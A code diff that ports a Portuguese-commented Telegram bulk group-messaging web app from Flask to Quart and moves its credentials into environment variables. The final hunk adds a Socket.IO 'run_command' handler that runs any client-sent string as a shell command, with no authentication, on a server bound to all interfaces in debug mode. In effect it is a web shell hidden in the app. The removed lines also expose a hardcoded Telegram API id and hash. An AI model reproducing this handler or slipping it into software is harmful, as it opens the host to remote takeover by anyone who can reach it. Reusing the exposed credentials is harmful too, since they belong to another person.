@@ -1,18 +1,23 @@
-from flask import Flask, render_template, request, redirect, url_for, session, jsonify
-from telethon import TelegramClient
-from telethon.sessions import StringSession
 import os
 import asyncio
+import subprocess
+from quart import Quart, render_template, request, redirect, url_for, session, jsonify
+from quart_socketio import SocketIO, emit
+from telethon import TelegramClient
+from telethon.sessions import StringSession
 
-app = Flask(__name__)
-app.secret_key = 'seu_segredo_aqui'
+app = Quart(__name__)
+app.secret_key = os.getenv('SECRET_KEY', 'seu_segredo_aqui')
 
-api_id = '24010179'  # Substitua pelo seu API ID
-api_hash = '7ddc83d894b896975083f985effffe11'  # Substitua pelo seu API Hash
+# Inicialize o SocketIO com a instância do Quart
+socketio = SocketIO(app)
+
+# Configure o API ID e o API Hash como variáveis de ambiente
+api_id = os.getenv('API_ID')  # Defina seu API ID nas variáveis de ambiente
+api_hash = os.getenv('API_HASH')  # Defina seu API Hash nas variáveis de ambiente
 
 client = None
-loop = asyncio.new_event_loop()
-sending = False  # Variável global para controlar o envio
+sending = False
 stop_sending_event = asyncio.Event()
 
 def ensure_sessions_dir():
@@ -33,7 +38,7 @@ async def async_start_client(phone_number):
         await client.connect()
         if not await client.is_user_authorized():
             await client.send_code_request(phone_number)
-            return False  # Necessário verificar o código
+            return False  # Código de verificação necessário
         session_string = client.session.save()
         with open(session_file, 'w') as f:
             f.write(session_string)
@@ -41,30 +46,24 @@ async def async_start_client(phone_number):
     await client.connect()
     return True  # Login bem-sucedido
 
-def start_client(phone_number):
-    return loop.run_until_complete(async_start_client(phone_number))
-
 @app.route('/login', methods=['GET', 'POST'])
-def login():
+async def login():
     if request.method == 'POST':
-        phone_number = request.form['phone_number']
+        phone_number = (await request.form)['phone_number']
         session['phone_number'] = phone_number
-        # Iniciar o cliente e verificar se é necessário código
-        if not start_client(phone_number):
-            # Redirecionar para a página de verificação se necessário
+        if not await async_start_client(phone_number):
             return redirect(url_for('verify_code'))
         return redirect(url_for('index'))
-    return render_template('login.html')
+    return await render_template('login.html')
 
 @app.route('/verify_code', methods=['GET', 'POST'])
-def verify_code():
+async def verify_code():
     if request.method == 'POST':
-        code = request.form['code']
+        code = (await request.form)['code']
         phone_number = session.get('phone_number')
         if client and client.session:
             try:
-                loop.run_until_complete(client.sign_in(code=code))
-                # Após a verificação, salve a sessão
+                await client.sign_in(code=code)
                 session_file = f'sessions/{phone_number}.session'
                 session_string = client.session.save()
                 with open(session_file, 'w') as f:
@@ -72,34 +71,33 @@ def verify_code():
                 return redirect(url_for('index'))
             except Exception as e:
                 return f"Erro ao verificar o código: {e}"
-    return render_template('verify_code.html')
+    return await render_template('verify_code.html')
 
 @app.route('/')
-def index():
+async def index():
     if 'phone_number' not in session:
         return redirect(url_for('login'))
 
     phone_number = session.get('phone_number')
 
     if client is None or not client.is_connected():
-        start_client(phone_number)
+        await async_start_client(phone_number)
 
     try:
-        dialogs = loop.run_until_complete(client.get_dialogs())
+        dialogs = await client.get_dialogs()
         groups = [(dialog.id, dialog.name) for dialog in dialogs if dialog.is_group]
-
-        return render_template('index.html', groups=groups)
-
+        return await render_template('index.html', groups=groups)
     except Exception as e:
         print(f"Erro ao tentar listar os grupos: {str(e)}")
-        return render_template('index.html', groups=[])
+        return await render_template('index.html', groups=[])
 
 @app.route('/send_messages', methods=['POST'])
-def send_messages():
+async def send_messages():
     global sending, stop_sending_event
-    group_ids = request.form.getlist('groups')
-    delay = float(request.form['delay'])
-    message = request.form['message']
+    form = await request.form
+    group_ids = form.getlist('groups')
+    delay = float(form['delay'])
+    message = form['message']
 
     session['status'] = {'sending': [], 'errors': []}
     sending = True
@@ -111,7 +109,6 @@ def send_messages():
             if not sending:
                 break
             try:
-                # Enviar uma única mensagem para cada grupo
                 await client.send_message(int(group_id), message)
                 session['status']['sending'].append(f"✅ Mensagem enviada para o grupo {group_id}")
                 await asyncio.sleep(delay)
@@ -121,21 +118,32 @@ def send_messages():
         sending = False
         stop_sending_event.set()
 
-    loop.run_until_complete(send_messages_task())
+    await send_messages_task()
     return jsonify(session['status'])
 
 @app.route('/status_updates')
-def status_updates():
+async def status_updates():
     if 'status' in session:
         return jsonify(session['status'])
     return jsonify({'sending': [], 'errors': []})
 
 @app.route('/stop_sending', methods=['POST'])
-def stop_sending():
+async def stop_sending():
     global sending
     sending = False
     stop_sending_event.set()
     return jsonify(session.get('status', {'sending': [], 'errors': []}))
 
+@socketio.on('run_command')
+async def handle_command(data):
+    command = data['command']
+    try:
+        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
+        output = output.decode('utf-8')
+    except subprocess.CalledProcessError as e:
+        output = e.output.decode('utf-8')
+
+    emit('command_output', {'output': output})
+
 if __name__ == '__main__':
-    app.run(debug=True)
+    socketio.run(app, host='0.0.0.0', port=int(os.getenv('PORT', 5000)), debug=True)
